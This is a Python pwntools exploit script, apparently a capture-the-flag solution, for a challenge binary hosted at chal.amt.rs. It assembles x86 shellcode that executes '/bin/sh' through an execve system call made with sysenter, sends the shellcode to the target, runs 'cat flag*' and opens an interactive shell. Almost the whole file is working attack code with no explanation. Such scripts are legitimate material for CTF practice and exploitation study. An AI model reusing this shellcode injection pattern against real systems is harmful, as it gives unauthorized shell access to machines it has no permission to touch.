from pwn import *
from icecream import ic

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

# context.binary = exe
context.log_level = "debug"
context.aslr = True
context.arch = 'amd64'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("chal.amt.rs", 1341)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

payload = '''
    mov esp, 0x1337020
    mov ebp, 0x1337000
    mov eax, 11
    xor ecx, ecx
    lea rbx, [rip+binsh]
    xor edx, edx
    sysenter 
loop:
    jmp loop

binsh:
    .asciz "/bin/sh"'''
# payload = payload.replace("int 0x80", "sysenter")
print(payload)
payload = asm(payload)
payload += cyclic(0x1000-len(payload))
sl(payload)
sl(b'cat flag*')
i()
